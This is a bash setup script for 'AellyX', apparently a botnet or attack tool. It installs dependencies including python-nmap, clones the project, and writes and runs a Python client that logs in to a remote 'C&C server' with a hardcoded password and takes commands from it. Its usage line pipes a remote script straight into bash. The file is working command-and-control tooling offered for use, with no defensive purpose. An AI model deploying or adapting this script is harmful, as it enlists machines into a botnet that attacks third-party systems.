#!/bin/bash
# AellyX Bot Client Setup for Ubuntu/Linux
# Usage: curl -sL https://raw.githubusercontent.com/k4ran909/AellyX/main/setup_bot.sh | SERVER_URL="http://YOUR-VPS:5261/" bash

SERVER_URL="${SERVER_URL:-http://localhost:5261/}"
PASS="#technoz833#"

echo "========================================"
echo "   AellyX Bot Client Setup"
echo "========================================"

# Install dependencies
echo "[1/3] Installing dependencies..."
sudo apt update -qq 2>/dev/null
sudo apt install python3-pip git -y -qq 2>/dev/null
pip3 install flask requests python-nmap --break-system-packages -q 2>/dev/null || pip3 install flask requests python-nmap -q

# Clone repo
echo "[2/3] Setting up AellyX..."
cd /tmp
rm -rf AellyX 2>/dev/null
git clone -q https://github.com/k4ran909/AellyX.git
cd AellyX

# Create bot script
echo "[3/3] Creating bot client..."
cat > bot_client.py << EOF
import sys
sys.path.insert(1, "./AellyX/")

from importlib import import_module
import requests
from time import sleep

SERVER_URL = "$SERVER_URL"
PASSWORD = "$PASS"

print("=" * 50)
print("AellyX Bot Client")
print(f"Connecting to: {SERVER_URL}")
print("=" * 50)

# Configure as bot
try:
    requests.post(SERVER_URL + "reset", data={"password": PASSWORD}, timeout=5)
    print(f"[+] Connected to C&C server")
except Exception as e:
    print(f"[-] Failed to connect: {e}")
    exit(1)

# Import and run with bot config
from CLIF_Framework.framework import console
var = console()
var.user_argv = ["main.py", "--connect", SERVER_URL, PASSWORD]
var.server = [True, False, SERVER_URL, PASSWORD, 1]

main = import_module("AellyX.main")
main.run()
EOF

echo ""
echo "========================================"
echo "   Bot Ready!"
echo "========================================"
echo ""
echo "Server: $SERVER_URL"
echo ""

python3 bot_client.py
